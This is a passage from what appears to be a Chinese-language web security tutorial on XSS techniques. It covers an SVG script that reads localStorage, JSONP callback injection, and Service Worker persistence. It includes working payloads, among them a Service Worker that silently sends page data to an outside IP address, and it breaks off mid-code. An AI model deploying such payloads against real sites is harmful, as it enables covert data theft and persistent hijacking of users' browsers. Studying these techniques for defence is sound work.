&lt;p&gt;与cookie相比的优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容量上讲Web Storage一般提供5M的存储空间&lt;/li&gt;
&lt;li&gt;安全性上WebStorage并不作为HTTP header发送&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;利用SVG盗取localStorage&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; standalone=&amp;quot;no&amp;quot;?&amp;gt;
&amp;lt;svg version=&amp;quot;1.1&amp;quot; xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; &amp;gt;
    &amp;lt;rect width=&amp;quot;100&amp;quot; height=&amp;quot;100&amp;quot; /&amp;gt;
    &amp;lt;script&amp;gt;
        if(localStorage.length)
        {
            for(key in localStorage)
            {
                if(localStorage.getItem(key))
                {
                    console.log(&amp;quot;key:&amp;quot; + key);
                    console.log(&amp;quot;value&amp;quot; + localStorage.getItem(key));
                }
            }
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;jsonp劫持&#34;&gt;JSONP劫持&lt;/h3&gt;
&lt;h4 id=&#34;jsonp&#34;&gt;JSONP&lt;/h4&gt;
&lt;p&gt;script标签是可以加载异域的JavaScript并执行的，并可以通过预先设定好的callback函数来实现和非同源页面的交互。&lt;/p&gt;
&lt;p&gt;某网站的客户端代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;JSONP 实例&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;divCustomers&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;callbackFunction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;methodName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;ul&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;li&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/li&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/ul&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;divCustomers&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerHTML&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;服务端jsonp.php代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-type: application/json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//获取回调函数名
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$jsoncallback&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;jsoncallback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//json数据
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$json_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[&amp;#34;customername1&amp;#34;,&amp;#34;customername2&amp;#34;]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//输出jsonp格式的数据
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$jsoncallback&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$json_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;劫持：&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&lt;/code&gt;中jsoncallback这个参数值为&lt;code&gt;&amp;lt;scrip&amp;gt;alert(&#39;1&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;，则输出至前端的数据为&lt;code&gt;&amp;lt;scrip&amp;gt;alert(&#39;1&#39;);&amp;lt;/script&amp;gt;[&amp;quot;customername1&amp;quot;,&amp;quot;customername2&amp;quot;]&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果前端Content-Type未设置或者是text/html、application/json，则响应到客户端的内容就会触发执行JS脚本。&lt;/p&gt;
&lt;h3 id=&#34;持久化之service-worker&#34;&gt;持久化之Service Worker&lt;/h3&gt;
&lt;p&gt;Service Worker技术基于web worker使得Web 应用离线缓存成为可能，更为后台同步、通知推送等功能提供了思路。&lt;/p&gt;
&lt;p&gt;该技术最核心的一个特性就是：Service Worker 工作线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的HTTP 请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;它注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。能够完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。并且由于service worker工作于worker上下文，因此它不能访问DOM。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;注意点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只能注册同源下的js&lt;/li&gt;
&lt;li&gt;网站必须是&lt;code&gt;https://&lt;/code&gt;或者&lt;code&gt;http://localhost/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Content-Type 为 */javascript&lt;/li&gt;
&lt;li&gt;Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;service-worker生命周期&#34;&gt;Service Worker生命周期&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;install -&amp;gt; installed -&amp;gt; activating -&amp;gt; =active -&amp;gt; activated -&amp;gt; redundant&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;进入redundant (废弃)状态的原因可能是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装(install)失败&lt;/li&gt;
&lt;li&gt;激活(activating)失败&lt;/li&gt;
&lt;li&gt;新版本的 Service Worker 替换了它并成为激活状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;注册&#34;&gt;注册&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serviceWorker&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/haha/test.js&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;scope&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Service Worker 的注册路径决定了其 &lt;code&gt;scope&lt;/code&gt; (默认作用范围)。示例中的&lt;code&gt;test.js&lt;/code&gt; 是在&lt;code&gt; /haha/&lt;/code&gt; 下，这使得该 Service Worker 默认只会收到&lt;code&gt;/haha/&lt;/code&gt;下的fetch 事件。如果存放在网站的根路径下，则将会收到该网站的所有 fetch 事件。&lt;/p&gt;
&lt;p&gt;如果希望改变它的作用域，可在第二个参数设置 scope 范围。&lt;/p&gt;
&lt;h4 id=&#34;安装&#34;&gt;安装&lt;/h4&gt;
&lt;p&gt;本地注册一个根目录下的Service Worker 脚本，作用域范围&lt;code&gt;http://localhost:8000/&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 215; 
			flex-basis: 517px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220122111424321.png&#34; data-size=&#34;1215x564&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220122111424321.png&#34;
			width=&#34;1215&#34;
			height=&#34;564&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220122111424321_hua9223e03181c42bc68d88d61a3dbf862_73717_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220122111424321_hua9223e03181c42bc68d88d61a3dbf862_73717_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;sw_test.js：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//监控install事件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;install&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;install&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//监控activate事件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;activate&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;activate&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
 
&lt;span class=&#34;c1&#34;&gt;//监控fetch事件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fetch&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;respondWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;script&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}}))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;刷新页面：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 343; 
			flex-basis: 824px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220122111449892.png&#34; data-size=&#34;457x133&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220122111449892.png&#34;
			width=&#34;457&#34;
			height=&#34;133&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220122111449892_hu3b603e317c0e5c8829ea78640f6ceab8_4438_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220122111449892_hu3b603e317c0e5c8829ea78640f6ceab8_4438_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;无感外带信息&#34;&gt;无感外带信息&lt;/h4&gt;
&lt;p&gt;sw_test.js:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//监听一个特定的url，如果是，则修改响应实现外带当前域的一些信息，例如document.cookie
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fetch&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;respondWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;caches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;clone&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:8000/mytest.js&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;script&amp;gt;var httpRequest = new XMLHttpRequest();httpRequest.open(&amp;#39;GET&amp;#39;, &amp;#39;http://192.168.0.102:8888/&amp;#39; + document.doamin, true);httpRequest.send();&amp;lt;/script&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}})&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
